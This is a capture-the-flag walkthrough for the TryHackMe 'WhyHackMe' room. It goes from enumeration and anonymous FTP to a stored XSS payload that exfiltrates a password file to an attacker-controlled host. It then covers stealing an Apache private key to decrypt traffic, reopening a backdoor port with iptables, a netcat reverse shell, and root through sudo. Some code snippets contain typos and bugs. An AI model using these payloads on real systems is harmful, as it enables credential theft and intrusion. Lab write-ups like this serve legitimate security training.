TryHackMe WhyHackMe Writeup

Begin by nmapping the machine.

```bash
sudo nmap -T4 -sS -O -Pn -sV <server>
[sudo] password for malware:
Starting Nmap 7.98 ( https://nmap.org ) at 2025-11-07 14:15 -0700
Nmap scan report for 10.201.113.215
Host is up (0.14s latency).
Not shown: 999 cloased tcp ports (reset)
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.3
No exact OS matches for host (If you know what OS is running it, see https://nmap.org/submit/ ). TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=11/7%OT=21% CT=1%CU=30936%PV=Y%DS=5%DC=I%G=Y%TM=690E618OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=107%TI=Z%CI=ZX%II=I%%TS=A)SEQOS:(SP=105%GCD=1%ISR=100%TI=Z% CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=108%TI=Z%OS:CI=Z%TS=A)SEQ(SP=108%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FC%GCD=1%IOS:SR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(01=M508ST11NW7%02=M588ST11NW7%03=M588NNT1OS:1NW7%04=M508ST11NW7%05=M508ST11NW7%06=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4OS:B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%0=M508NNSNW7%CC=Y%Q=OS:)T1(R=Y%DF=Y%T=40%S=0%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W
OS:=0%S=A%A=Z%F=R%0=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%0=%RD=0%Q=)
OS:T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%0=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=
OS:164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
Network Distance: 5 hops
Service Info: OS: Unix
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ Nmap done: 1 IP address (1 host up) scanned in 17.05 seconds

```

Right away we see that the only port that is open is port 21 (ftp)

Let's see if we can log in anonymously:

```bash

ftp <server>

Connected to 10.201.113.215. 220 (vsFTPd 3.0.3)
Name (10.201.113.215: malware): anonymous 331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV. 150 Here comes the directory listing.
-rw-r--r--
10
226 Directory send OK.
0
318 Mar 14 2023 update.txt
ftp>
```

Here we can see that there's a file called 'update.txt' 

we can grab it using:

```bash
get update.txt
```
Once it's been downloaded locally we can cat into it and gives us and intersting hint:

<4. cat update.txt>

While I never got any hits on my side regarding a web server, i'm going to assume that there is one based on the hint.

Let's run gobuster:

```bash
gobuster dir -u http://<server> -w /usr/share/wordlists/dirb/common.txt 

Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
=================================================================
[+] Url:                     http://10.201.113.215
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   484
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
=================================================================
Starting gobuster in directory enumeration mode
=================================================================
.hta                  (Status: 403) [Size: 279]
.htpasswd             (Status: 403) [Size: 279]
.htaccess             (Status: 403) [Size: 279]
assets                (Status: 301) [Size: 317] [--> http://10.201.113.215/assets/1 (Status: 403) [Size: 279]
cgi-bin/              (Status: 403) [Size: 279]
dir                   (Status: 403) [Size: 279]
index.php             (Status: 403) [Size: 279]
server-status
Progress: 4613 / 4613 (100.00%)
=================================================================
Finished
=================================================================
```
Based on the results we can confirm that there is a web server. 

Let's navigate to the server in our browser and check out some of the hits that we got on gobuster.

<6. visting the web server >

<7. assets page>

Let's try to refine our search and specfically look for php now, we'll also use a larger word dictionary. 

```bash
gobuster dir -u http://10.201.113.215 -w /use/share/wordlists/dirb/big.txt -x php
==============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
==============================================================
[+] Url: http://10.201.113.215
[+] Method: GET
[+] Threads: 10
[+] Wordlist: /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes: 484
[+] User Agent: gobuster/3.8.2
[+] Extensions: php
[+] Timeout: 10s
==============================================================
Starting gobuster in directory enumeration mode
==============================================================
.htaccess           (Status: 403) [Size: 279]
.htaccess.php       (Status: 403) [Size: 279]
.htpasswd           (Status: 403) [Size: 279]
.htpasswd.php       (Status: 403) [Size: 279]
assets              (Status: 301) [Size: 317] [--> http://10.201.113.215/assets/] 
blog.php            (Status: 200) [Size: 3102]
cgi-bin/            (Status: 403) [Size: 279]
cgi-bin/.php        (Status: 403) [Size: 279] 
config.php          (Status: 200) [Size: 0]
dir                 (Status: 403) [Size: 279]
index.php           (Status: 200) [Size: 563]
Login.php           (Status: 200) [Size: 523]
Logout.php          (Status: 302) [Size: 0] [--> login.php]
register.php        (Status: 200) [Size: 643]
server-status       (Status: 403) [Size: 279]
Progress: 40938 / 40938 (100.00%)
==============================================================
Finished
==============================================================
```

This output gives a lot more data to work with reagrding the web server. Let's navigate to:

```bash
http://<server>/dir
```

No luck.

< 9. accessing dir>

Let's pivot and look at:

```bash
http://<server>/login.php
```
The landing page shows us a log in screen.

<10. login image>

Navigating to register and creating an account works, lets make one. 

<12. visiting register>

Let's log in and then navigate to /blog to see if we can make a post now. 

```bash
http://<server>/blog.php
```
Looks like our comment was successfully sent. 

<13. blog comment >

Let's see if it sanitizes comments by sending in a very simple XSS script, if successful this should prompt a alert on our screen in a notifcation box. 

<14. testing for XSS vulnerability>

Refreshed the page and nothing showed, even though the comment was successfully sent. 
But what if we create a user account with a XSS script? I wonder if the register page handles any input sanitization. 
Using the same alert script, we register for an account and looks like its vulnerable. 

<15. registered for an account>

Now we know that it's possible to expoit the register page we can deliver a payload. 
But first we need to make a javascript to grab the data we're looking for.
Remember the hint that we were given earlier? We're going to be grabbing /dir/pass.txt.

```bash
fetch('http://<127.0.0.1/dir/pass.txt')
    .then(response => response.txt())
    .then(data => {
        let attackerServer = 'http://<hostIP>:8000/catch?data=' + encodeURIComponent(data);
        let img = document.createElement('img);
        img.src = attackServer;
        document.body.appendChild(img);
    });
```
The above code is what I used, but you might have to play around with it. There are several iterations that you can find that will work, do what works best for you.

Let's start our listener, unless specified this will default to port 8000, we'll use that for the XSS payload as well for the registered user.

```bash
python3 -m http.server
```
Once that is done let's create a new account with the username:

```bash
<script src="http://<hostIP>:80/<scriptName>"></script>
```
then login. 

If everything went accordingly, we should see that we extracted pass.txt

Let's quickly decode it by running it through URL decoder.

<23. url decoded>

With that we should be able to FTP into jack's account.

```bash
ftp jack@<server>
Connected to 10.201.55.231.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV. 150 Here comes the directory listing.
-rw-r--r--
1 1001
226 Directory send OK.
ftp> get user.txt
1001
33 Mar 14 2023 user.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for user.txt (33 bytes).
226 Transfer complete.
33 bytes received in 0.0006 seconds (52.3191 kbytes/s)
ftp>
```
In the snippet above I exracted the user.txt and we get our first flag.

Swap from ftp and ssh using the same credentials, but we need to find what permission jack has on the system.
Running the command:

```bash
sudo -l
```
In the image below we can see that jack has permissions to '/usr/sbin/iptables'

<27. checking sudo permissions>

After some more poking around under the directory:

```bash
jack@ubuntu:/$ cd opt
jack@ubuntu:/opt$ ls
capture.pcap urgent.txt
jack@ubuntu:/opt$ cat urgent.txt 
jack@ubuntu:/opt$ Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go throug h the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.
```
Okay there's another hint for us. 
Let's check cgi-bin. Look's like that folder is owned by root and a user named h4ck3d.

<29. cgi-bin permissions>

In the meantime, let's take a look at the capture.pcap that was given to us as well, we'll extract it using:

```bash
scp jack@<server>:/opt/capture.pcap /home/<user>/Downloads
```
We can see that the pcap file has encrypted data.

<3. encrypted pcap>

We can grab the key to decrypt this if we extract the apache.key typically stored here:

```bash
scp jack@<server>:/etc/apache2/certs/apache.key /home/<user>/Downloads
```
Navigate back to wireshark and then were going to go to:

```bash

preferences => RSA Key => Add new keyfile =>

<34. rsa image>

Now we can see the traffic in cleartext, let's filter wireshark using this 'tcp.port == 41312 && http'
We know it's port 41312 based on the iptables that we saw earlier.

<35. decrypted wireshark traffic>


It look's like they have been using a backdoor to gain access to the server, clearly the hackers still have a way in. Let's see if we can use and follow their footprints.
Let's create permissions on the iptables so it accepts connections.

Breakdown: -I INPUT 1, this will put it at the top of the list
           -p tcp, connection over tcp
           --dport 41312, specifies the port that will be open
           -j ACCEPT, ensures that the port is open and accepts connections
``bash
sudo iptables -I INPUT 1 -p tcp --dport 41312 -j ACCEPT
```
Quickly confirm that it worked and ensure that the top 2 lines look like this, you want to ensure your new route is above the old one to over ride it.

```bash
sudo iptables -L

jack@ubuntu:/usr/lib$ sudo iptables -L
Chain INPUT (policy ACCEPT) 
target   prot   opt    source        destination
ACCEPT   tcp    --     anywhere      anywhere               tcp dpt:41312
DROP     tcp    --     anywhere      anywhere               tcp dpt:41312
```
Below we can see the web address for the backdoor long with the group ID's that the folder beloongs to.

<38. group id>

Now that we can successfully connect we can inject a url encoded payload to get a shell.

<38. url encoded payload>

Make sure you have your listener started before you connect:

```bash
nc -nlvp 4444
Connection received on 10.201.107.172 39584
whoami
www-data
```
We check for privileges and see that all commands have root capabilites.

```bash
www-data@ubuntu:/$ sudo bash
sudo bash
root@ubuntu:$ cat /root/root.txt
cat root.txt
******************************
```
Congratulations, you've completed the room!


